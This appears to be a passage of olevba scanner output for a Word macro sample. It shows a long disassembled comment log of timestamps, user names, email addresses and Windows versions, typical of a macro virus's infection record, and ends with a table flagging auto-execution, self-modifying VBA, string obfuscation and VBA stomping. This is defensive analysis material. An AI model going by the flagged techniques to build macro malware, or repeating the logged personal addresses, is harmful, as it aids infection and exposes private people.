' 	QuoteRem 0x0000 0x0011 "19.04.02 13:15:50"
' Line #7969:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7970:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7971:
' Line #7972:
' Line #7973:
' 	QuoteRem 0x0000 0x0011 "19.04.02 13:18:26"
' Line #7974:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7975:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7976:
' Line #7977:
' Line #7978:
' 	QuoteRem 0x0000 0x0011 "19.04.02 15:18:11"
' Line #7979:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7980:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7981:
' Line #7982:
' Line #7983:
' 	QuoteRem 0x0000 0x0011 "19.04.02 15:53:56"
' Line #7984:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7985:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7986:
' Line #7987:
' Line #7988:
' 	QuoteRem 0x0000 0x0011 "19.04.02 17:06:21"
' Line #7989:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7990:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7991:
' Line #7992:
' Line #7993:
' 	QuoteRem 0x0000 0x0011 "19.04.02 17:06:31"
' Line #7994:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #7995:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #7996:
' Line #7997:
' Line #7998:
' 	QuoteRem 0x0000 0x0011 "19.04.02 17:07:35"
' Line #7999:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8000:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8001:
' Line #8002:
' Line #8003:
' 	QuoteRem 0x0000 0x0011 "22.04.02 11:39:00"
' Line #8004:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8005:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8006:
' Line #8007:
' Line #8008:
' 	QuoteRem 0x0000 0x0011 "22.04.02 11:55:45"
' Line #8009:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8010:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8011:
' Line #8012:
' Line #8013:
' 	QuoteRem 0x0000 0x0011 "22.04.02 12:27:12"
' Line #8014:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8015:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8016:
' Line #8017:
' Line #8018:
' 	QuoteRem 0x0000 0x0011 "22.04.02 16:45:24"
' Line #8019:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8020:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8021:
' Line #8022:
' Line #8023:
' 	QuoteRem 0x0000 0x0011 "22.04.02 16:58:53"
' Line #8024:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8025:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8026:
' Line #8027:
' Line #8028:
' 	QuoteRem 0x0000 0x0010 "23.04.00 9:28:17"
' Line #8029:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8030:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8031:
' Line #8032:
' Line #8033:
' 	QuoteRem 0x0000 0x0010 "23.04.00 9:29:02"
' Line #8034:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8035:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8036:
' Line #8037:
' Line #8038:
' 	QuoteRem 0x0000 0x0011 "23.04.00 12:57:08"
' Line #8039:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8040:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8041:
' Line #8042:
' Line #8043:
' 	QuoteRem 0x0000 0x0011 "23.04.02 13:07:33"
' Line #8044:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8045:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8046:
' Line #8047:
' Line #8048:
' 	QuoteRem 0x0000 0x0011 "23.04.02 14:21:45"
' Line #8049:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8050:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8051:
' Line #8052:
' Line #8053:
' 	QuoteRem 0x0000 0x0011 "23.04.02 18:33:33"
' Line #8054:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8055:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8056:
' Line #8057:
' Line #8058:
' 	QuoteRem 0x0000 0x0011 "23.04.02 18:37:04"
' Line #8059:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8060:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8061:
' Line #8062:
' Line #8063:
' 	QuoteRem 0x0000 0x0011 "23.04.02 19:07:37"
' Line #8064:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8065:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8066:
' Line #8067:
' Line #8068:
' 	QuoteRem 0x0000 0x0011 "23.04.02 20:29:05"
' Line #8069:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8070:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8071:
' Line #8072:
' Line #8073:
' 	QuoteRem 0x0000 0x0010 "24.04.02 7:37:18"
' Line #8074:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8075:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8076:
' Line #8077:
' Line #8078:
' 	QuoteRem 0x0000 0x0010 "24.04.02 9:27:41"
' Line #8079:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8080:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8081:
' Line #8082:
' Line #8083:
' 	QuoteRem 0x0000 0x0011 "24.04.02 11:55:10"
' Line #8084:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8085:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8086:
' Line #8087:
' Line #8088:
' 	QuoteRem 0x0000 0x0011 "24.04.02 11:55:56"
' Line #8089:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8090:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8091:
' Line #8092:
' Line #8093:
' 	QuoteRem 0x0000 0x0011 "24.04.02 12:45:19"
' Line #8094:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8095:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8096:
' Line #8097:
' Line #8098:
' 	QuoteRem 0x0000 0x0011 "24.04.02 12:49:48"
' Line #8099:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8100:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8101:
' Line #8102:
' Line #8103:
' 	QuoteRem 0x0000 0x0011 "24.04.02 14:29:25"
' Line #8104:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8105:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8106:
' Line #8107:
' Line #8108:
' 	QuoteRem 0x0000 0x0011 "24.04.02 14:50:29"
' Line #8109:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8110:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8111:
' Line #8112:
' Line #8113:
' 	QuoteRem 0x0000 0x0011 "24.04.02 19:08:17"
' Line #8114:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8115:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8116:
' Line #8117:
' Line #8118:
' 	QuoteRem 0x0000 0x0011 "24.04.02 20:22:36"
' Line #8119:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8120:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8121:
' Line #8122:
' Line #8123:
' 	QuoteRem 0x0000 0x0011 "24.04.02 20:49:53"
' Line #8124:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8125:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8126:
' Line #8127:
' Line #8128:
' 	QuoteRem 0x0000 0x0010 "25.04.02 6:55:10"
' Line #8129:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8130:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8131:
' Line #8132:
' Line #8133:
' 	QuoteRem 0x0000 0x0011 "25.04.02 10:06:49"
' Line #8134:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8135:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8136:
' Line #8137:
' Line #8138:
' 	QuoteRem 0x0000 0x0011 "25.04.02 10:21:48"
' Line #8139:
' 	QuoteRem 0x0000 0x0007 "ÌÀÃÀËßÑ"
' Line #8140:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8141:
' Line #8142:
' Line #8143:
' 	QuoteRem 0x0000 0x0011 "25.04.02 16:31:33"
' Line #8144:
' 	QuoteRem 0x0000 0x0015 "Primak 0leg@yandex.ru"
' Line #8145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #8146:
' Line #8147:
' Line #8148:
' 	QuoteRem 0x0000 0x0011 "25.04.02 17:08:47"
' Line #8149:
' 	QuoteRem 0x0000 0x0004 "Äèìà"
' Line #8150:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8151:
' Line #8152:
' Line #8153:
' 	QuoteRem 0x0000 0x0011 "21.05.02 17:36:12"
' Line #8154:
' 	QuoteRem 0x0000 0x0020 "TJ 2000 TJ780611@ThePentagon.Com"
' Line #8155:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8156:
' Line #8157:
' Line #8158:
' 	QuoteRem 0x0000 0x0011 "21.05.02 17:36:53"
' Line #8159:
' 	QuoteRem 0x0000 0x0020 "TJ 2000 TJ780611@ThePentagon.Com"
' Line #8160:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #8161:
' Line #8162:
' Line #8163:
' 	QuoteRem 0x0000 0x0011 "6/7/02 3:42:21 PM"
' Line #8164:
' 	QuoteRem 0x0000 0x0008 "Ditry PC"
' Line #8165:
' 	QuoteRem 0x0000 0x0013 "Windows 4.0 Pentium"
' Line #8166:
' Line #8167:
' Line #8168:
' 	QuoteRem 0x0000 0x0011 "6/7/02 3:42:25 PM"
' Line #8169:
' 	QuoteRem 0x0000 0x0008 "Ditry PC"
' Line #8170:
' 	QuoteRem 0x0000 0x0013 "Windows 4.0 Pentium"
' Line #8171:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

